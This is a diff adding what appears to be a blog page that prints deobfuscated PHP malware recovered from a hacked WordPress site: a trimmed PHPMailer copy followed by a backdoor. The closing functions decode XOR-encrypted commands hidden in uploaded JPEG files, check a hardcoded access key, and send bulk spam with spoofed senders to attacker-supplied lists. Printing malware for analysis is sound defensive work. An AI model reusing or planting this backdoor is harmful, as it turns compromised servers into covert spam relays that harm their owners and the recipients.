+                    if (($str == $encoded) &amp;&amp; !preg_match('/[^A-Za-z0-9!#$%&amp;\'*+\/=?^_`{|}~ -]/', $str)) {
+                        return ($encoded);
+                    } else {
+                        return (&quot;\&quot;$encoded\&quot;&quot;);
+                    }
+                }
+                $matchcount = preg_match_all('/[^\040\041\043-\133\135-\176]/', $str, $matches);
+                break;
+            /** @noinspection PhpMissingBreakStatementInspection */
+            case 'comment':
+                $matchcount = preg_match_all('/[()&quot;]/', $str, $matches);
+            // Intentional fall-through
+            case 'text':
+            default:
+                $matchcount += preg_match_all('/[\000-\010\013\014\016-\037\177-\377]/', $str, $matches);
+                break;
+        }
+
+        if ($matchcount == 0) { // There are no chars that need encoding
+            return ($str);
+        }
+
+        $maxlen = 75 - 7 - strlen($this-&gt;CharSet);
+        // Try to select the encoding which should produce the shortest output
+        if ($matchcount &gt; strlen($str) / 3) {
+            // More than a third of the content will need encoding, so B encoding will be most efficient
+            $encoding = 'B';
+            if (function_exists('mb_strlen') &amp;&amp; $this-&gt;hasMultiBytes($str)) {
+                $encoded = $this-&gt;base64EncodeWrapMB($str, &quot;\n&quot;);
+            } else {
+                $encoded = base64_encode($str);
+                $maxlen -= $maxlen % 4;
+                $encoded = trim(chunk_split($encoded, $maxlen, &quot;\n&quot;));
+            }
+        } else {
+            $encoding = 'Q';
+            $encoded  = $this-&gt;encodeQ($str, $position);
+            $encoded  = $this-&gt;wrapText($encoded, $maxlen, true);
+            $encoded  = str_replace('=' . self::CRLF, &quot;\n&quot;, trim($encoded));
+        }
+
+        $encoded = preg_replace('/^(.*)$/m', ' =?' . $this-&gt;CharSet . &quot;?$encoding?\\1?=&quot;, $encoded);
+        $encoded = trim(str_replace(&quot;\n&quot;, $this-&gt;LE, $encoded));
+
+        return $encoded;
+    }
+
+
+    public function hasMultiBytes($str)
+    {
+        if (function_exists('mb_strlen')) {
+            return (strlen($str) &gt; mb_strlen($str, $this-&gt;CharSet));
+        } else { // Assume no multibytes (we can't handle without mbstring functions anyway)
+            return false;
+        }
+    }
+
+
+    public function has8bitChars($text)
+    {
+        return (boolean) preg_match('/[\x80-\xFF]/', $text);
+    }
+
+
+    public function base64EncodeWrapMB($str, $linebreak = null)
+    {
+        $start   = '=?' . $this-&gt;CharSet . '?B?';
+        $end     = '?=';
+        $encoded = '';
+        if ($linebreak === null) {
+            $linebreak = $this-&gt;LE;
+        }
+
+        $mb_length = mb_strlen($str, $this-&gt;CharSet);
+        // Each line must have length &lt;= 75, including $start and $end
+        $length    = 75 - strlen($start) - strlen($end);
+        // Average multi-byte ratio
+        $ratio     = $mb_length / strlen($str);
+        // Base64 has a 4:3 ratio
+        $avgLength = floor($length * $ratio * .75);
+
+        for ($i = 0; $i &lt; $mb_length; $i += $offset) {
+            $lookBack = 0;
+            do {
+                $offset = $avgLength - $lookBack;
+                $chunk  = mb_substr($str, $i, $offset, $this-&gt;CharSet);
+                $chunk  = base64_encode($chunk);
+                $lookBack++;
+            } while (strlen($chunk) &gt; $length);
+            $encoded .= $chunk . $linebreak;
+        }
+
+        // Chomp the last linefeed
+        $encoded = substr($encoded, 0, -strlen($linebreak));
+        return $encoded;
+    }
+
+
+    public function encodeQP($string, $line_max = 76)
+    {
+        if (function_exists('quoted_printable_encode')) { // Use native function if it's available (&gt;= PHP5.3)
+            return $this-&gt;fixEOL(quoted_printable_encode($string));
+        }
+        // Fall back to a pure PHP implementation
+        $string = str_replace(array(
+            '%20',
+            '%0D%0A.',
+            '%0D%0A',
+            '%'
+        ), array(
+            ' ',
+            &quot;\r\n=2E&quot;,
+            &quot;\r\n&quot;,
+            '='
+        ), rawurlencode($string));
+        $string = preg_replace('/[^\r\n]{' . ($line_max - 3) . '}[^=\r\n]{2}/', &quot;$0=\r\n&quot;, $string);
+        return $this-&gt;fixEOL($string);
+    }
+
+
+    public function encodeQPphp($string, $line_max = 76, /** @noinspection PhpUnusedParameterInspection */ $space_conv = false)
+    {
+        return $this-&gt;encodeQP($string, $line_max);
+    }
+
+
+    public function encodeQ($str, $position = 'text')
+    {
+        // There should not be any EOL in the string
+        $pattern = '';
+        $encoded = str_replace(array(
+            &quot;\r&quot;,
+            &quot;\n&quot;
+        ), '', $str);
+        switch (strtolower($position)) {
+            case 'phrase':
+                // RFC 2047 section 5.3
+                $pattern = '^A-Za-z0-9!*+\/ -';
+                break;
+            /** @noinspection PhpMissingBreakStatementInspection */
+            case 'comment':
+            // RFC 2047 section 5.2
+                $pattern = '\(\)&quot;';
+
+            case 'text':
+            default:
+
+                $pattern = '\000-\011\013\014\016-\037\075\077\137\177-\377' . $pattern;
+                break;
+        }
+        $matches = array();
+        if (preg_match_all(&quot;/[{$pattern}]/&quot;, $encoded, $matches)) {
+
+            $eqkey = array_search('=', $matches[0]);
+            if (false !== $eqkey) {
+                unset($matches[0][$eqkey]);
+                array_unshift($matches[0], '=');
+            }
+            foreach (array_unique($matches[0]) as $char) {
+                $encoded = str_replace($char, '=' . sprintf('%02X', ord($char)), $encoded);
+            }
+        }
+        // Replace every spaces to _ (more readable than =20)
+        return str_replace(' ', '_', $encoded);
+    }
+
+
+    public function addStringAttachment($string, $filename, $encoding = 'base64', $type = '', $disposition = 'attachment')
+    {
+        // If a MIME type is not specified, try to work it out from the file name
+        if ($type == '') {
+            $type = self::filenameToType($filename);
+        }
+        // Append to $attachment array
+        $this-&gt;attachment[] = array(
+            0 =&gt; $string,
+            1 =&gt; $filename,
+            2 =&gt; basename($filename),
+            3 =&gt; $encoding,
+            4 =&gt; $type,
+            5 =&gt; true, // isStringAttachment
+            6 =&gt; $disposition,
+            7 =&gt; 0
+        );
+    }
+
+    public function addEmbeddedImage($path, $cid, $name = '', $encoding = 'base64', $type = '', $disposition = 'inline')
+    {
+        if (!@is_file($path)) {
+            $this-&gt;setError($this-&gt;lang('file_access') . $path);
+            return false;
+        }
+
+        // If a MIME type is not specified, try to work it out from the file name
+        if ($type == '') {
+            $type = self::filenameToType($path);
+        }
+
+        $filename = basename($path);
+        if ($name == '') {
+            $name = $filename;
+        }
+
+        // Append to $attachment array
+        $this-&gt;attachment[] = array(
+            0 =&gt; $path,
+            1 =&gt; $filename,
+            2 =&gt; $name,
+            3 =&gt; $encoding,
+            4 =&gt; $type,
+            5 =&gt; false, // isStringAttachment
+            6 =&gt; $disposition,
+            7 =&gt; $cid
+        );
+        return true;
+    }
+
+
+    public function addStringEmbeddedImage($string, $cid, $name = '', $encoding = 'base64', $type = '', $disposition = 'inline')
+    {
+        // If a MIME type is not specified, try to work it out from the name
+        if ($type == '') {
+            $type = self::filenameToType($name);
+        }
+
+        // Append to $attachment array
+        $this-&gt;attachment[] = array(
+            0 =&gt; $string,
+            1 =&gt; $name,
+            2 =&gt; $name,
+            3 =&gt; $encoding,
+            4 =&gt; $type,
+            5 =&gt; true, // isStringAttachment
+            6 =&gt; $disposition,
+            7 =&gt; $cid
+        );
+        return true;
+    }
+
+    public function inlineImageExists()
+    {
+        foreach ($this-&gt;attachment as $attachment) {
+            if ($attachment[6] == 'inline') {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    public function attachmentExists()
+    {
+        foreach ($this-&gt;attachment as $attachment) {
+            if ($attachment[6] == 'attachment') {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    public function alternativeExists()
+    {
+        return !empty($this-&gt;AltBody);
+    }
+
+    public function clearAddresses()
+    {
+        foreach ($this-&gt;to as $to) {
+            unset($this-&gt;all_recipients[strtolower($to[0])]);
+        }
+        $this-&gt;to = array();
+    }
+
+    public function clearCCs()
+    {
+        foreach ($this-&gt;cc as $cc) {
+            unset($this-&gt;all_recipients[strtolower($cc[0])]);
+        }
+        $this-&gt;cc = array();
+    }
+
+    public function clearBCCs()
+    {
+        foreach ($this-&gt;bcc as $bcc) {
+            unset($this-&gt;all_recipients[strtolower($bcc[0])]);
+        }
+        $this-&gt;bcc = array();
+    }
+
+    public function clearReplyTos()
+    {
+        $this-&gt;ReplyTo = array();
+    }
+
+
+    public function clearAllRecipients()
+    {
+        $this-&gt;to             = array();
+        $this-&gt;cc             = array();
+        $this-&gt;bcc            = array();
+        $this-&gt;all_recipients = array();
+    }
+
+    public function clearAttachments()
+    {
+        $this-&gt;attachment = array();
+    }
+
+    public function clearCustomHeaders()
+    {
+        $this-&gt;CustomHeader = array();
+    }
+
+    protected function setError($msg)
+    {
+        $this-&gt;error_count++;
+        if ($this-&gt;Mailer == 'smtp' and !is_null($this-&gt;smtp)) {
+            $lasterror = $this-&gt;smtp-&gt;getError();
+            if (!empty($lasterror) and array_key_exists('smtp_msg', $lasterror)) {
+                $msg .= '&lt;p&gt;' . $this-&gt;lang('smtp_error') . $lasterror['smtp_msg'] . &quot;&lt;/p&gt;\n&quot;;
+            }
+        }
+        $this-&gt;ErrorInfo = $msg;
+    }
+
+    public static function rfcDate()
+    {
+        // Set the time zone to whatever the default is to avoid 500 errors
+        // Will default to UTC if it's not set properly in php.ini
+        date_default_timezone_set(@date_default_timezone_get());
+        return date('D, j M Y H:i:s O');
+    }
+
+    protected function serverHostname()
+    {
+        $result = 'localhost.localdomain';
+        if (!empty($this-&gt;Hostname)) {
+            $result = $this-&gt;Hostname;
+        } elseif (isset($_SERVER) and array_key_exists('SERVER_NAME', $_SERVER) and !empty($_SERVER['SERVER_NAME'])) {
+            $result = $_SERVER['SERVER_NAME'];
+        } elseif (function_exists('gethostname') &amp;&amp; gethostname() !== false) {
+            $result = gethostname();
+        } elseif (php_uname('n') !== false) {
+            $result = php_uname('n');
+        }
+        return $result;
+    }
+
+    protected function lang($key)
+    {
+        if (count($this-&gt;language) &lt; 1) {
+            $this-&gt;setLanguage('en'); // set the default language
+        }
+
+        if (isset($this-&gt;language[$key])) {
+            return $this-&gt;language[$key];
+        } else {
+            return 'Language string failed to load: ' . $key;
+        }
+    }
+
+    public function isError()
+    {
+        return ($this-&gt;error_count &gt; 0);
+    }
+
+    public function fixEOL($str)
+    {
+        // Normalise to \n
+        $nstr = str_replace(array(
+            &quot;\r\n&quot;,
+            &quot;\r&quot;
+        ), &quot;\n&quot;, $str);
+        // Now convert LE as needed
+        if ($this-&gt;LE !== &quot;\n&quot;) {
+            $nstr = str_replace(&quot;\n&quot;, $this-&gt;LE, $nstr);
+        }
+        return $nstr;
+    }
+
+
+    public function addCustomHeader($name, $value = null)
+    {
+        if ($value === null) {
+            // Value passed in as name:value
+            $this-&gt;CustomHeader[] = explode(':', $name, 2);
+        } else {
+            $this-&gt;CustomHeader[] = array(
+                $name,
+                $value
+            );
+        }
+    }
+
+    public function msgHTML($message, $basedir = '', $advanced = false)
+    {
+        preg_match_all('/(src|background)=[&quot;\'](.*)[&quot;\']/Ui', $message, $images);
+        if (isset($images[2])) {
+            foreach ($images[2] as $imgindex =&gt; $url) {
+                // Convert data URIs into embedded images
+                if (preg_match('#^data:(image[^;,]*)(;base64)?,#', $url, $match)) {
+                    $data = substr($url, strpos($url, ','));
+                    if ($match[2]) {
+                        $data = base64_decode($data);
+                    } else {
+                        $data = rawurldecode($data);
+                    }
+                    $cid = md5($url) . '@phpmailer.0'; // RFC2392 S 2
+                    if ($this-&gt;addStringEmbeddedImage($data, $cid, '', 'base64', $match[1])) {
+                        $message = str_replace($images[0][$imgindex], $images[1][$imgindex] . '=&quot;cid:' . $cid . '&quot;', $message);
+                    }
+                } elseif (!preg_match('#^[A-z]+://#', $url)) {
+                    // Do not change urls for absolute images (thanks to corvuscorax)
+                    $filename  = basename($url);
+                    $directory = dirname($url);
+                    if ($directory == '.') {
+                        $directory = '';
+                    }
+                    $cid = md5($url) . '@phpmailer.0'; // RFC2392 S 2
+                    if (strlen($basedir) &gt; 1 &amp;&amp; substr($basedir, -1) != '/') {
+                        $basedir .= '/';
+                    }
+                    if (strlen($directory) &gt; 1 &amp;&amp; substr($directory, -1) != '/') {
+                        $directory .= '/';
+                    }
+                    if ($this-&gt;addEmbeddedImage($basedir . $directory . $filename, $cid, $filename, 'base64', self::_mime_types((string) self::mb_pathinfo($filename, PATHINFO_EXTENSION)))) {
+                        $message = preg_replace('/' . $images[1][$imgindex] . '=[&quot;\']' . preg_quote($url, '/') . '[&quot;\']/Ui', $images[1][$imgindex] . '=&quot;cid:' . $cid . '&quot;', $message);
+                    }
+                }
+            }
+        }
+        $this-&gt;isHTML(true);
+        // Convert all message body line breaks to CRLF, makes quoted-printable encoding work much better
+        $this-&gt;Body    = $this-&gt;normalizeBreaks($message);
+        $this-&gt;AltBody = $this-&gt;normalizeBreaks($this-&gt;html2text($message, $advanced));
+        if (empty($this-&gt;AltBody)) {
+            $this-&gt;AltBody = 'To view this email message, open it in a program that understands HTML!' . self::CRLF . self::CRLF;
+        }
+        return $this-&gt;Body;
+    }
+
+
+    public function html2text($html, $advanced = false)
+    {
+        if (is_callable($advanced)) {
+            return call_user_func($advanced, $html);
+        }
+        return html_entity_decode(trim(custom_strip_tags(preg_replace('/&lt;(head|title|style|script)[^&gt;]*&gt;.*?&lt;\/\\1&gt;/si', '', $html))), ENT_QUOTES, $this-&gt;CharSet);
+    }
+
+
+    public static function _mime_types($ext = '')
+    {
+        $mimes = array(
+            'xl' =&gt; 'application/excel',
+            'js' =&gt; 'application/javascript',
+            'hqx' =&gt; 'application/mac-binhex40',
+            'cpt' =&gt; 'application/mac-compactpro',
+            'bin' =&gt; 'application/macbinary',
+            'doc' =&gt; 'application/msword',
+            'word' =&gt; 'application/msword',
+            'class' =&gt; 'application/octet-stream',
+            'dll' =&gt; 'application/octet-stream',
+            'dms' =&gt; 'application/octet-stream',
+            'exe' =&gt; 'application/octet-stream',
+            'lha' =&gt; 'application/octet-stream',
+            'lzh' =&gt; 'application/octet-stream',
+            'psd' =&gt; 'application/octet-stream',
+            'sea' =&gt; 'application/octet-stream',
+            'so' =&gt; 'application/octet-stream',
+            'oda' =&gt; 'application/oda',
+            'pdf' =&gt; 'application/pdf',
+            'ai' =&gt; 'application/postscript',
+            'eps' =&gt; 'application/postscript',
+            'ps' =&gt; 'application/postscript',
+            'smi' =&gt; 'application/smil',
+            'smil' =&gt; 'application/smil',
+            'mif' =&gt; 'application/vnd.mif',
+            'xls' =&gt; 'application/vnd.ms-excel',
+            'ppt' =&gt; 'application/vnd.ms-powerpoint',
+            'wbxml' =&gt; 'application/vnd.wap.wbxml',
+            'wmlc' =&gt; 'application/vnd.wap.wmlc',
+            'dcr' =&gt; 'application/x-director',
+            'dir' =&gt; 'application/x-director',
+            'dxr' =&gt; 'application/x-director',
+            'dvi' =&gt; 'application/x-dvi',
+            'gtar' =&gt; 'application/x-gtar',
+            'php3' =&gt; 'application/x-httpd-php',
+            'php4' =&gt; 'application/x-httpd-php',
+            'php' =&gt; 'application/x-httpd-php',
+            'phtml' =&gt; 'application/x-httpd-php',
+            'phps' =&gt; 'application/x-httpd-php-source',
+            'swf' =&gt; 'application/x-shockwave-flash',
+            'sit' =&gt; 'application/x-stuffit',
+            'tar' =&gt; 'application/x-tar',
+            'tgz' =&gt; 'application/x-tar',
+            'xht' =&gt; 'application/xhtml+xml',
+            'xhtml' =&gt; 'application/xhtml+xml',
+            'zip' =&gt; 'application/zip',
+            'mid' =&gt; 'audio/midi',
+            'midi' =&gt; 'audio/midi',
+            'mp2' =&gt; 'audio/mpeg',
+            'mp3' =&gt; 'audio/mpeg',
+            'mpga' =&gt; 'audio/mpeg',
+            'aif' =&gt; 'audio/x-aiff',
+            'aifc' =&gt; 'audio/x-aiff',
+            'aiff' =&gt; 'audio/x-aiff',
+            'ram' =&gt; 'audio/x-pn-realaudio',
+            'rm' =&gt; 'audio/x-pn-realaudio',
+            'rpm' =&gt; 'audio/x-pn-realaudio-plugin',
+            'ra' =&gt; 'audio/x-realaudio',
+            'wav' =&gt; 'audio/x-wav',
+            'bmp' =&gt; 'image/bmp',
+            'gif' =&gt; 'image/gif',
+            'jpeg' =&gt; 'image/jpeg',
+            'jpe' =&gt; 'image/jpeg',
+            'jpg' =&gt; 'image/jpeg',
+            'png' =&gt; 'image/png',
+            'tiff' =&gt; 'image/tiff',
+            'tif' =&gt; 'image/tiff',
+            'eml' =&gt; 'message/rfc822',
+            'css' =&gt; 'text/css',
+            'html' =&gt; 'text/html',
+            'htm' =&gt; 'text/html',
+            'shtml' =&gt; 'text/html',
+            'log' =&gt; 'text/plain',
+            'text' =&gt; 'text/plain',
+            'txt' =&gt; 'text/plain',
+            'rtx' =&gt; 'text/richtext',
+            'rtf' =&gt; 'text/rtf',
+            'vcf' =&gt; 'text/vcard',
+            'vcard' =&gt; 'text/vcard',
+            'xml' =&gt; 'text/xml',
+            'xsl' =&gt; 'text/xml',
+            'mpeg' =&gt; 'video/mpeg',
+            'mpe' =&gt; 'video/mpeg',
+            'mpg' =&gt; 'video/mpeg',
+            'mov' =&gt; 'video/quicktime',
+            'qt' =&gt; 'video/quicktime',
+            'rv' =&gt; 'video/vnd.rn-realvideo',
+            'avi' =&gt; 'video/x-msvideo',
+            'movie' =&gt; 'video/x-sgi-movie'
+        );
+        return (array_key_exists(strtolower($ext), $mimes) ? $mimes[strtolower($ext)] : 'application/octet-stream');
+    }
+
+
+    public static function filenameToType($filename)
+    {
+        // In case the path is a URL, strip any query string before getting extension
+        $qpos = strpos($filename, '?');
+        if (false !== $qpos) {
+            $filename = substr($filename, 0, $qpos);
+        }
+        $pathinfo = self::mb_pathinfo($filename);
+        return self::_mime_types($pathinfo['extension']);
+    }
+
+
+    public static function mb_pathinfo($path, $options = null)
+    {
+        $ret      = array(
+            'dirname' =&gt; '',
+            'basename' =&gt; '',
+            'extension' =&gt; '',
+            'filename' =&gt; ''
+        );
+        $pathinfo = array();
+        if (preg_match('%^(.*?)[\\\\/]*(([^/\\\\]*?)(\.([^\.\\\\/]+?)|))[\\\\/\.]*$%im', $path, $pathinfo)) {
+            if (array_key_exists(1, $pathinfo)) {
+                $ret['dirname'] = $pathinfo[1];
+            }
+            if (array_key_exists(2, $pathinfo)) {
+                $ret['basename'] = $pathinfo[2];
+            }
+            if (array_key_exists(5, $pathinfo)) {
+                $ret['extension'] = $pathinfo[5];
+            }
+            if (array_key_exists(3, $pathinfo)) {
+                $ret['filename'] = $pathinfo[3];
+            }
+        }
+        switch ($options) {
+            case PATHINFO_DIRNAME:
+            case 'dirname':
+                return $ret['dirname'];
+            case PATHINFO_BASENAME:
+            case 'basename':
+                return $ret['basename'];
+            case PATHINFO_EXTENSION:
+            case 'extension':
+                return $ret['extension'];
+            case PATHINFO_FILENAME:
+            case 'filename':
+                return $ret['filename'];
+            default:
+                return $ret;
+        }
+    }
+
+    public function set($name, $value = '')
+    {
+        try {
+            if (isset($this-&gt;$name)) {
+                $this-&gt;$name = $value;
+            } else {
+                throw new phpmailerException($this-&gt;lang('variable_set') . $name, self::STOP_CRITICAL);
+            }
+        }
+        catch (Exception $exc) {
+            $this-&gt;setError($exc-&gt;getMessage());
+            if ($exc-&gt;getCode() == self::STOP_CRITICAL) {
+                return false;
+            }
+        }
+        return true;
+    }
+
+
+    public function secureHeader($str)
+    {
+        return trim(str_replace(array(
+            &quot;\r&quot;,
+            &quot;\n&quot;
+        ), '', $str));
+    }
+
+    public static function normalizeBreaks($text, $breaktype = &quot;\r\n&quot;)
+    {
+        return preg_replace('/(\r\n|\r|\n)/ms', $breaktype, $text);
+    }
+
+
+    public function sign($cert_filename, $key_filename, $key_pass)
+    {
+        $this-&gt;sign_cert_file = $cert_filename;
+        $this-&gt;sign_key_file  = $key_filename;
+        $this-&gt;sign_key_pass  = $key_pass;
+    }
+
+    public function DKIM_QP($txt)
+    {
+        $line = '';
+        for ($i = 0; $i &lt; strlen($txt); $i++) {
+            $ord = ord($txt[$i]);
+            if (((0x21 &lt;= $ord) &amp;&amp; ($ord &lt;= 0x3A)) || $ord == 0x3C || ((0x3E &lt;= $ord) &amp;&amp; ($ord &lt;= 0x7E))) {
+                $line .= $txt[$i];
+            } else {
+                $line .= '=' . sprintf('%02X', $ord);
+            }
+        }
+        return $line;
+    }
+
+    public function DKIM_Sign($signHeader)
+    {
+        if (!defined('PKCS7_TEXT')) {
+            if ($this-&gt;exceptions) {
+                throw new phpmailerException($this-&gt;lang('signing') . ' OpenSSL extension missing.');
+            }
+            return '';
+        }
+        $privKeyStr = file_get_contents($this-&gt;DKIM_private);
+        if ($this-&gt;DKIM_passphrase != '') {
+            $privKey = openssl_pkey_get_private($privKeyStr, $this-&gt;DKIM_passphrase);
+        } else {
+            $privKey = $privKeyStr;
+        }
+        if (openssl_sign($signHeader, $signature, $privKey)) {
+            return base64_encode($signature);
+        }
+        return '';
+    }
+
+    public function DKIM_HeaderC($signHeader)
+    {
+        $signHeader = preg_replace('/\r\n\s+/', ' ', $signHeader);
+        $lines      = explode(&quot;\r\n&quot;, $signHeader);
+        foreach ($lines as $key =&gt; $line) {
+            list($heading, $value) = explode(':', $line, 2);
+            $heading     = strtolower($heading);
+            $value       = preg_replace('/\s+/', ' ', $value); // Compress useless spaces
+            $lines[$key] = $heading . ':' . trim($value); // Don't forget to remove WSP around the value
+        }
+        $signHeader = implode(&quot;\r\n&quot;, $lines);
+        return $signHeader;
+    }
+
+    public function DKIM_BodyC($body)
+    {
+        if ($body == '') {
+            return &quot;\r\n&quot;;
+        }
+        // stabilize line endings
+        $body = str_replace(&quot;\r\n&quot;, &quot;\n&quot;, $body);
+        $body = str_replace(&quot;\n&quot;, &quot;\r\n&quot;, $body);
+        // END stabilize line endings
+        while (substr($body, strlen($body) - 4, 4) == &quot;\r\n\r\n&quot;) {
+            $body = substr($body, 0, strlen($body) - 2);
+        }
+        return $body;
+    }
+
+    public function DKIM_Add($headers_line, $subject, $body)
+    {
+        $DKIMsignatureType    = 'rsa-sha1'; // Signature &amp; hash algorithms
+        $DKIMcanonicalization = 'relaxed/simple'; // Canonicalization of header/body
+        $DKIMquery            = 'dns/txt'; // Query method
+        $DKIMtime             = time(); // Signature Timestamp = seconds since 00:00:00 - Jan 1, 1970 (UTC time zone)
+        $subject_header       = &quot;Subject: $subject&quot;;
+        $headers              = explode($this-&gt;LE, $headers_line);
+        $from_header          = '';
+        $to_header            = '';
+        $current              = '';
+        foreach ($headers as $header) {
+            if (strpos($header, 'From:') === 0) {
+                $from_header = $header;
+                $current     = 'from_header';
+            } elseif (strpos($header, 'To:') === 0) {
+                $to_header = $header;
+                $current   = 'to_header';
+            } else {
+                if ($current &amp;&amp; strpos($header, ' =?') === 0) {
+                    $current .= $header;
+                } else {
+                    $current = '';
+                }
+            }
+        }
+        $from     = str_replace('|', '=7C', $this-&gt;DKIM_QP($from_header));
+        $to       = str_replace('|', '=7C', $this-&gt;DKIM_QP($to_header));
+        $subject  = str_replace('|', '=7C', $this-&gt;DKIM_QP($subject_header)); // Copied header fields (dkim-quoted-printable)
+        $body     = $this-&gt;DKIM_BodyC($body);
+        $DKIMlen  = strlen($body); // Length of body
+        $DKIMb64  = base64_encode(pack('H*', sha1($body))); // Base64 of packed binary SHA-1 hash of body
+        $ident    = ($this-&gt;DKIM_identity == '') ? '' : ' i=' . $this-&gt;DKIM_identity . ';';
+        $dkimhdrs = 'DKIM-Signature: v=1; a=' . $DKIMsignatureType . '; q=' . $DKIMquery . '; l=' . $DKIMlen . '; s=' . $this-&gt;DKIM_selector . &quot;;\r\n&quot; . &quot;\tt=&quot; . $DKIMtime . '; c=' . $DKIMcanonicalization . &quot;;\r\n&quot; . &quot;\th=From:To:Subject;\r\n&quot; . &quot;\td=&quot; . $this-&gt;DKIM_domain . ';' . $ident . &quot;\r\n&quot; . &quot;\tz=$from\r\n&quot; . &quot;\t|$to\r\n&quot; . &quot;\t|$subject;\r\n&quot; . &quot;\tbh=&quot; . $DKIMb64 . &quot;;\r\n&quot; . &quot;\tb=&quot;;
+        $toSign   = $this-&gt;DKIM_HeaderC($from_header . &quot;\r\n&quot; . $to_header . &quot;\r\n&quot; . $subject_header . &quot;\r\n&quot; . $dkimhdrs);
+        $signed   = $this-&gt;DKIM_Sign($toSign);
+        return $dkimhdrs . $signed . &quot;\r\n&quot;;
+    }
+
+    public function getToAddresses()
+    {
+        return $this-&gt;to;
+    }
+
+
+    public function getCcAddresses()
+    {
+        return $this-&gt;cc;
+    }
+
+
+    public function getBccAddresses()
+    {
+        return $this-&gt;bcc;
+    }
+
+
+    public function getReplyToAddresses()
+    {
+        return $this-&gt;ReplyTo;
+    }
+
+
+    public function getAllRecipientAddresses()
+    {
+        return $this-&gt;all_recipients;
+    }
+
+
+    protected function doCallback($isSent, $to, $cc, $bcc, $subject, $body, $from)
+    {
+        if (!empty($this-&gt;action_function) &amp;&amp; is_callable($this-&gt;action_function)) {
+            $params = array(
+                $isSent,
+                $to,
+                $cc,
+                $bcc,
+                $subject,
+                $body,
+                $from
+            );
+            call_user_func_array($this-&gt;action_function, $params);
+        }
+    }
+}
+
+class phpmailerException extends Exception
+{
+    public function errorMessage()
+    {
+        $errorMsg = '&lt;strong&gt;' . $this-&gt;getMessage() . &quot;&lt;/strong&gt;&lt;br /&gt;\n&quot;;
+        return $errorMsg;
+    }
+}
+
+
+
+/////////////////////////////////////////////////////////////////
+
+function sendSmtpMail($from_email, $from_name, $to, $subject, $body, $type, $config_file)
+{
+    $mail = new PHPMailer();
+    $mail-&gt;isMail();
+
+    $mail-&gt;CharSet = 'utf-8';
+    $mail-&gt;SetFrom($from_email, $from_name);
+    $mail-&gt;AddAddress($to);
+    $mail-&gt;Subject = $subject;
+
+    if ($type == &quot;1&quot;) {
+        $mail-&gt;MsgHTML($body);
+    } elseif ($type == &quot;2&quot;) {
+        $mail-&gt;isHTML(false);
+        $mail-&gt;Body = $body;
+    }
+
+    if (isset($_FILES)) {
+        foreach ($_FILES as $key =&gt; $file) {
+            if ($file['tmp_name'] != $config_file) {
+                $mail-&gt;addAttachment($file['tmp_name'], $file['name']);
+            }
+        }
+    }
+
+    if (!$mail-&gt;send()) {
+        return $mail-&gt;ErrorInfo;
+    } else {
+        return 0;
+    }
+}
+
+if (isset($_FILES)) {
+    foreach ($_FILES as $key =&gt; $file) {
+        if (strpos($file['name'], &quot;.jpg&quot;)) {
+            $res = type1_send($file['tmp_name']);
+            if ($res) {
+                echo $res;
+            }
+        }
+    }
+}
+
+
+function myhex2bin($str)
+{
+    $sbin = &quot;&quot;;
+    $len  = strlen($str);
+    for ($i = 0; $i &lt; $len; $i += 2) {
+        $sbin .= pack(&quot;H*&quot;, substr($str, $i, 2));
+    }
+
+    return $sbin;
+}
+
+
+function decode($data, $key)
+{
+    $out_data = &quot;&quot;;
+
+    for ($i = 0; $i &lt; strlen($data);) {
+        for ($j = 0; $j &lt; strlen($key) &amp;&amp; $i &lt; strlen($data); $j++, $i++) {
+            $out_data .= chr(ord($data[$i]) ^ ord($key[$j]));
+        }
+    }
+
+    return $out_data;
+}
+
+function type1_send($config_file)
+{
+    $data      = file_get_contents($config_file);
+    $start_pos = strpos($data, myhex2bin(&quot;ffda&quot;));
+    if ($start_pos) {
+        $start_pos += (20);
+        $end_pos = strrpos($data, myhex2bin(&quot;ffd9&quot;));
+        if ($end_pos) {
+            $data = substr($data, $start_pos, $end_pos);
+        } else {
+            return FALSE;
+        }
+    } else {
+        return FALSE;
+    }
+
+    $key  = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+    $data = decode($data, $key);
+    $data = @unserialize($data);
+
+    if (!$data || !isset($data['ak'])) {
+        return FALSE;
+    }
+
+    if ($data['ak'] != &quot;63847b04-bf9e-42e1-8ad8-e0d312dbddea&quot;) {
+        exit();
+    }
+
+    if (isset($data['c'])) {
+        $res[&quot;r&quot;][&quot;c&quot;] = $data['c'];
+        return base64_encode(serialize($res));
+
+    }
+
+    $good       = 0;
+    $bad        = 0;
+    $last_error = 0;
+
+    foreach ($data['e'] as $uid =&gt; $email) {
+        $theme = $data['s'][array_rand($data['s'])];
+        $theme = alter_macros($theme);
+        $theme = num_macros($theme);
+        $theme = xnum_macros($theme);
+
+        $message = $data['l'];
+        $message = alter_macros($message);
+        $message = num_macros($message);
+        $message = xnum_macros($message);
+        $message = fteil_macros($message, $uid);
+
+        $from = $data['f'][array_rand($data['f'])];
+        $from = alter_macros($from);
+        $from = num_macros($from);
+        $from = xnum_macros($from);
+
+        if (strstr($from, &quot;[CUSTOM]&quot;) == FALSE) {
+            $from = from_host($from);
+        } else {
+            $from = str_replace(&quot;[CUSTOM]&quot;, &quot;&quot;, $from);
+        }
+
+        $from_email = explode(&quot;&lt;&quot;, $from);
+        $from_email = explode(&quot;&gt;&quot;, $from_email[1]);
+        $from_name  = explode(&quot;\&quot;&quot;, $from);
+
+        $last_error = sendSmtpMail($from_email[0], $from_name[1], $email, $theme, $message, $data['lt'], $config_file);
+
+        if ($last_error === 0) {
+            $good++;
+        } else {
+            $bad++;
+            $good = count($data['e']) - $bad;
+        }
+    }
+
+    $res[&quot;r&quot;][&quot;e&quot;] = $last_error === FALSE ? 0 : $last_error;
+    $res[&quot;r&quot;][&quot;g&quot;] = $good;
+    $res[&quot;r&quot;][&quot;b&quot;] = $bad;
+
+    return base64_encode(serialize($res));
+}
+</code></pre>
+
+    <div id="social-bar">
+	<ul class="rrssb-buttons clearfix">
+      <li class="email">
+          <a href="mailto:?subject=Deobfuscated%20code%20from%20the%20WordPress%20hack&amp;body=http://sa.muel.be/addendum/2015/deobfuscated-code-from-the-wordpress-hack/">
+              <span class="icon">
+                  <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="28px" height="28px" viewBox="0 0 28 28" enable-background="new 0 0 28 28" xml:space="preserve">
